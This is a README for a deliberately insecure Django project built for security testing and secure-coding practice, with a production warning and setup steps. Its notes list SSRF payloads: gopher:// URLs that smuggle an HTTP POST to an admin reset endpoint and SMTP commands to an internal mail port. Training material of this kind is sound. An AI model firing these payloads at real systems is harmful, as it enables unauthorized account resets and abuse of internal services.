# insecure-django

This is a deliberately written insecure implementation of django to promote Security Testing and Secure Coding Practice. Not an attempt to demonstrate anything in the django core.

# Warning: Critical Security Vulnerabilities are in this project. Refer this work with care. Do not use in production.


### Set up

1. Install Python3, Django
2. `pip install -r requirements.txt`

Notes:
Ref:
http://localhost:8000/xploitSSRF/api

gopher://localhost:8081/_GET%20/1.txt%20HTTP/1.1%0a


gopher://localhost:8000/_POST%20/xploitSSRF/api/admin/reset%20HTTP/1.1%0aContent-Type:application/x-www-form-urlencoded%0aContent-Length:9%0a%0auser_id=admin%0a


gopher://localhost:25/_HELO%20kali.localdomain%0AMAIL%20FROM:%20<kali@kali.localdomain>%0ARCPT%20To:%20<kali@kali.localdomain>%0ADATA%0ASubject:%20Test%0Awoot%0A.%0A

gopher://localhost:25/_HELO%20kali.localdomain%0aMAIL%20FROM:%20<kali@kali.localdomain>%0ARCPT%20To:%20<kali@kali.localdomain>%0aSubject:%20Test%0awoot%0a.%0a


HELO%20kali.localdomain%0AMAIL%20FROM:%20<kali@kali.localdomain>%0ARCPT%20To:%20<kali@kali.localdomain>%0ADATA%0ASubject:%20Test%0Awoot%0A.%0A